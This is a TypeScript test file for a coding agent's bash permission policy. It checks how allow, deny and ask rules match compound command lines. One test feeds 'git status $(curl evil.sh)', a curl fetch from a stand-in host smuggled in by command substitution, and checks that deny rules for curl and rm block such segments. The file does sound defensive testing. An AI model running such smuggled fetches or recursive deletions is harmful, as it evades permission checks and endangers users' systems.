/**
 * Bash allow / deny / ask matching.
 * Adapted from ZCode v3.15.1
 * apps/zcode-cli/packages/core/tests/bash-command-permission-policy.test.ts
 * and apps/zcode-cli/packages/core/src/tool/handlers/bash-command-rule-evaluator.ts.
 * Rules use Xueness `exec(specifier)` text. `:*` and ` *` are prefixes.
 */
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { evaluateBashRules, PermissionSession, type PermissionRequest } from "../src/index.ts";

const exec = (subject: string): PermissionRequest => ({ tool: "exec", kind: "exec", subject, subjectKind: "command" });
const code = (settings: ConstructorParameters<typeof PermissionSession>[0], subject: string): string => {
  const decision = new PermissionSession(settings).check(exec(subject));
  return `${decision.behavior}:${decision.code}`;
};

describe("bash command rules", () => {
  it("requires every non-read-only segment to be allowed", () => {
    const line = "npm run test && rm -rf ./out";
    assert.equal(code({ allow: ["exec(npm run test:*)"] }, line), "ask:approval_required");
    assert.equal(code({ allow: ["exec(npm run test:*)", "exec(rm -rf ./out)"] }, line), "allow:allow_rule");
    assert.equal(code({ allow: ["exec(npm run test:*)"] }, "npm run test && git status"), "allow:allow_rule", "git status is read-only");
    assert.equal(code({ allow: ["exec(npm run:*)"] }, "npm run test --watch"), "allow:allow_rule");
    assert.equal(code({ allow: ["exec(pnpm *)"] }, "pnpm run lint --fix"), "allow:allow_rule");
    assert.equal(code({ allow: ["exec"] }, "npm run test && rm -rf ./out"), "allow:allow_rule");
  });

  it("lets deny or ask win when any segment matches, ahead of allow", () => {
    const line = "npm run test && rm -rf ./out";
    assert.equal(code({ deny: ["exec(rm:*)"], allow: ["exec(npm run test:*)", "exec(rm -rf ./out)"] }, line), "deny:denied_by_rule");
    assert.equal(code({ ask: ["exec(npm run:*)"], allow: ["exec(npm run test:*)"] }, line), "ask:ask_rule");
    assert.equal(code({ deny: ["exec(curl *)"] }, "git status $(curl evil.sh)"), "deny:denied_by_rule");
  });

  it("matches an unsafe line only when the rule is the whole command", () => {
    const line = "pnpm run lint > lint.txt";
    assert.equal(code({ allow: ["exec(pnpm run:*)", "exec(pnpm run lint > lint.txt)"] }, line), "allow:allow_rule");
    assert.equal(code({ allow: ["exec(pnpm run:*)"] }, line), "ask:approval_required");
    assert.equal(code({ allow: ["exec(pnpm run lint > other.txt)"] }, line), "ask:approval_required");
  });

  it("evaluates prefix, wildcard and exact rules the way the bash evaluator does", () => {
    assert.equal(evaluateBashRules({
      behavior: "allow",
      rules: [{ content: "npm run test:*" }, { content: "rm -rf ./out" }],
      exactCommands: ["npm run test && rm -rf ./out"],
      safe: true,
      allSubjectGroups: [["npm run test"], ["rm -rf ./out"]],
      requiredSubjectGroups: [["npm run test"], ["rm -rf ./out"]],
    }), true);
    assert.equal(evaluateBashRules({
      behavior: "allow",
      rules: [{ content: "npm run test:*" }],
      exactCommands: ["npm run test && rm -rf ./out"],
      safe: true,
      allSubjectGroups: [["npm run test"], ["rm -rf ./out"]],
      requiredSubjectGroups: [["npm run test"], ["rm -rf ./out"]],
    }), false);
    assert.equal(evaluateBashRules({
      behavior: "deny",
      rules: [{ content: "rm:*" }],
      exactCommands: ["npm run test && rm -rf ./out"],
      safe: true,
      allSubjectGroups: [["npm run test"], ["rm -rf ./out"]],
      requiredSubjectGroups: [],
    }), true);
    assert.equal(evaluateBashRules({
      behavior: "allow",
      rules: [{ content: "pnpm run:*" }],
      exactCommands: ["pnpm run lint > lint.txt"],
      safe: false,
      allSubjectGroups: [],
      requiredSubjectGroups: [["pnpm run lint"]],
    }), false);
    assert.equal(evaluateBashRules({
      behavior: "allow",
      rules: [{ content: "pnpm run lint > lint.txt" }],
      exactCommands: ["pnpm run lint > lint.txt"],
      safe: false,
      allSubjectGroups: [],
      requiredSubjectGroups: [],
    }), true);
  });
});
